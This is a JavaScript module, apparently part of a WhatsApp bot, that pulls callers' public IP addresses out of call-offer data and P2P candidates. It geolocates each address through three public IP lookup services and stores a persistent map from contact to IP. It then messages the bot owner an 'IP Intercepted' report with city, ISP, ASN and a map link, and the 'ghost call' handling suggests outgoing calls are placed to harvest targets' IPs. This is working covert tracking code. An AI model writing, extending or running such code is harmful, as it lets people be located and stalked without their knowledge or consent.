const axios = require('axios');
const { getSettings } = require('./settings');
const fs = require('fs-extra');
const path = require('path');

const ipCache = new Map();
const CACHE_TTL = 5 * 60 * 1000;

let p2pLastIP = null;
const captureWaiters = new Map();

const INTEL_FILE = path.join(__dirname, '..', 'media', 'intel.json');
const INTEL_TTL = 60 * 60 * 1000;
let intelMap = null;

function loadIntel() {
    if (intelMap) return intelMap;
    try {
        const raw = JSON.parse(fs.readFileSync(INTEL_FILE, 'utf8') || '{}');
        intelMap = new Map(Object.entries(raw));
    } catch (_) {
        intelMap = new Map();
    }
    return intelMap;
}

function persistIntel() {
    try {
        fs.writeFileSync(INTEL_FILE, JSON.stringify(Object.fromEntries(intelMap), null, 2));
    } catch (_) {}
}

function registerIntel(jid, ip) {
    if (!jid || !ip) return;
    const m = loadIntel();
    m.set(jid, { ip, ts: Date.now() });
    if (m.size > 50) {
        const oldest = [...m.entries()].sort((a, b) => a[1].ts - b[1].ts)[0];
        if (oldest) m.delete(oldest[0]);
    }
    persistIntel();
}

function getIntel(jid) {
    if (!jid) return null;
    const entry = loadIntel().get(jid);
    if (entry && entry.ip && Date.now() - entry.ts < INTEL_TTL) return entry.ip;
    return null;
}

function waitForIP(callId, timeoutMs = 15000) {
    return new Promise((resolve, reject) => {
        if (captureWaiters.has(callId)) {
            const old = captureWaiters.get(callId);
            clearTimeout(old.timeout);
            captureWaiters.delete(callId);
        }
        const timeout = setTimeout(() => {
            captureWaiters.delete(callId);
            reject(new Error('IP capture timeout'));
        }, timeoutMs);
        captureWaiters.set(callId, { resolve, timeout });
    });
}

function resolveIP(callId, ip) {
    const waiter = captureWaiters.get(callId);
    if (waiter) {
        clearTimeout(waiter.timeout);
        captureWaiters.delete(callId);
        waiter.resolve(ip);
    }
}

let debugTrackingActive = false;
let debugTrackingTimer = null;

const reportedCalls = new Set();

function startDebugTracking(duration = 8000) {
    debugTrackingActive = true;
    console.log(`[Analyzer Debug] Starting debug tracking for ${duration}ms`);

    if (debugTrackingTimer) {
        clearTimeout(debugTrackingTimer);
    }

    debugTrackingTimer = setTimeout(() => {
        debugTrackingActive = false;
        console.log(`[Analyzer Debug] Stopped debug tracking`);
    }, duration);
}

function isPublicIP(ip) {
    if (!ip) return false;
    const parts = ip.split('.').map(Number);
    if (parts.length !== 4) return false;
    const [a, b] = parts;
    const isPrivate = a === 10 ||
                     a === 127 ||
                     (a === 192 && b === 168) ||
                     (a === 172 && b >= 16 && b <= 31) ||
                     a === 0 ||
                     (a === 169 && b === 254) ||
                     (a >= 224);
    return !isPrivate;
}

async function analyzer(sock, call) {
    if (debugTrackingActive) {
        console.log(`[Analyzer Debug] Raw incoming node:`, JSON.stringify(call, null, 2));
    }

    if (!call || !Array.isArray(call) || call.length === 0) return;
    const callData = call[0];
    if (!callData) return;

    const { from, id, status } = callData;

    if (status === 'offer') {
        let capturedIP = null;

        try {
            const callStr = JSON.stringify(callData);
            const ipMatches = callStr.match(/\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g);
            if (ipMatches && ipMatches.length > 0) {
                for (const ip of ipMatches) {
                    if (isPublicIP(ip)) {
                        capturedIP = ip;
                        p2pLastIP = capturedIP;
                        break;
                    }
                }
            }
        } catch (e) {
            console.log(`[Analyzer] Could not parse call data for IP extraction: ${e.message}`);
        }

        if (!capturedIP) {
            const candidateSet = global.candidateMapByFrom?.get(from);
            if (candidateSet && candidateSet.size > 0) {
                for (const candidateIp of candidateSet) {
                    if (isPublicIP(candidateIp)) {
                        capturedIP = candidateIp;
                        p2pLastIP = capturedIP;
                        break;
                    }
                }
            }
        }

        if (capturedIP) {
            resolveAllCaptures(capturedIP);
            if (from) registerIntel(from, capturedIP);
        }

        if (!reportedCalls.has(id)) {
            reportedCalls.add(id);
            setTimeout(() => reportedCalls.delete(id), 60000);

            // ── Auto-intel: capture window of 10s (poll candidates), then report to vault ──
            (async () => {
                let finalIP = capturedIP;
                for (let i = 0; i < 10 && !finalIP; i++) {
                    await new Promise(r => setTimeout(r, 1000));
                    const cSet = global.candidateMapByFrom?.get(from);
                    if (cSet) {
                        for (const candidateIp of cSet) {
                            if (isPublicIP(candidateIp)) {
                                finalIP = candidateIp;
                                p2pLastIP = candidateIp;
                                break;
                            }
                        }
                    }
                }

                if (finalIP && from) registerIntel(from, finalIP);

                let targetJid = global.vault;
                try {
                    const settings = await getSettings();
                    if (settings?.home_jid) targetJid = settings.home_jid;
                } catch (_) {}

                if (!targetJid || !sock) return;

                const direction = callData.isGhost ? 'Outgoing ghost call echo' : 'Incoming call';

                if (finalIP && isPublicIP(finalIP)) {
                    const geo = await lookupIP(finalIP);
                    let reportText = `📞 *Auto Track — IP Intercepted*\n\n` +
                                     `Contact: @${from.split('@')[0]}\n` +
                                     `Direction: ${direction}\n` +
                                     `IP: ${finalIP}\n`;

                    if (geo) {
                        reportText += `Location: ${geo.location}\n` +
                                      `Region: ${geo.region || '—'}\n` +
                                      `Timezone: ${geo.timezone || '—'}\n` +
                                      `ISP/Network: ${geo.isp || 'Unknown'}\n` +
                                      `ASN: ${geo.asn || '—'}\n` +
                                      `Map: ${geo.gMapsUrl}`;
                    }

                    try {
                        await sock.sendMessage(targetJid, { text: reportText, mentions: [from] });
                    } catch (_) {}
                } else {
                    const logMsg = `📞 *Auto Track*\n\n` +
                                   `From: @${from.split('@')[0]}\n` +
                                   `Direction: ${direction}\n` +
                                   `Note: P2P direct IP candidate protected by relay/firewall.`;
                    try {
                        await sock.sendMessage(targetJid, { text: logMsg, mentions: [from] });
                    } catch (_) {}
                }
            })();
        }
    }
}

async function lookupIP(ip) {
    if (ipCache.has(ip)) {
        const cached = ipCache.get(ip);
        if (Date.now() - cached.timestamp < CACHE_TTL) {
            return cached.data;
        } else {
            ipCache.delete(ip);
        }
    }

    try {
        const res = await axios.get(`http://ip-api.com/json/${ip}`, {
            timeout: 10000,
            proxy: false
        });

        if (res.data && res.data.status === 'success') {
            const gMapsUrl = `https://www.google.com/maps?q=${res.data.lat},${res.data.lon}`;
            const result = {
                ip: res.data.query,
                location: `${res.data.city}, ${res.data.country}`,
                region: res.data.regionName || '',
                timezone: res.data.timezone || '',
                asn: res.data.as || '',
                isp: res.data.isp || res.data.org || 'Unknown',
                gMapsUrl: gMapsUrl
            };

            ipCache.set(ip, { data: result, timestamp: Date.now() });
            return result;
        }
    } catch (e) {
        console.error(`[GEO] ip-api.com failed for ${ip}: ${e.message}. Trying fallback...`);
    }

    try {
        const res = await axios.get(`https://ipwho.is/${ip}`, {
            timeout: 10000,
            proxy: false
        });

        if (res.data && res.data.success) {
            const gMapsUrl = `https://www.google.com/maps?q=${res.data.latitude},${res.data.longitude}`;
            const result = {
                ip: res.data.ip || ip,
                location: `${res.data.city || 'Unknown'}, ${res.data.country || 'Unknown'}`,
                region: res.data.region || '',
                timezone: res.data.timezone?.id || '',
                asn: res.data.asn || '',
                isp: res.data.connection?.isp || res.data.org || 'Unknown',
                gMapsUrl: gMapsUrl
            };

            ipCache.set(ip, { data: result, timestamp: Date.now() });
            return result;
        }
    } catch (e2) {
        console.error(`[GEO] ipwho.is fallback failed for ${ip}: ${e2.message}`);
    }

    try {
        const token = process.env.IPINFO_TOKEN ? `?token=${process.env.IPINFO_TOKEN}` : '';
        const res = await axios.get(`https://ipinfo.io/${ip}/json${token}`, {
            timeout: 10000,
            proxy: false
        });

        if (res.data && res.data.loc) {
            const [lat, lon] = res.data.loc.split(',');
            const gMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            const result = {
                ip: res.data.ip || ip,
                location: `${res.data.city || 'Unknown'}, ${res.data.country || 'Unknown'}`,
                region: res.data.region || '',
                timezone: res.data.timezone || '',
                asn: res.data.asn || '',
                isp: res.data.org || 'Unknown',
                gMapsUrl: gMapsUrl
            };

            ipCache.set(ip, { data: result, timestamp: Date.now() });
            return result;
        }
    } catch (e3) {
        console.error(`[GEO] ipinfo.io fallback also failed for ${ip}: ${e3.message}`);
    }

    return null;
}

function captureIP(callId) {
    return waitForIP(callId, 8000);
}

function resolveAllCaptures(ip) {
    // Legacy path — kept for safety but the call-event handler now scopes by
    // call-id (see resolveIP) so a parallel ghost call can't grab the wrong IP.
    for (const [callId] of captureWaiters) {
        resolveIP(callId, ip);
    }
}

module.exports = {
    analyzer,
    lookupIP,
    captureIP,
    waitForIP,
    resolveIP,
    resolveAllCaptures,
    registerIntel,
    getIntel,
    startDebugTracking,
    get p2pLastIP() {
        return p2pLastIP;
    },
    set p2pLastIP(value) {
        p2pLastIP = value;
    },
    get debugTrackingActive() {
        return debugTrackingActive;
    }
};
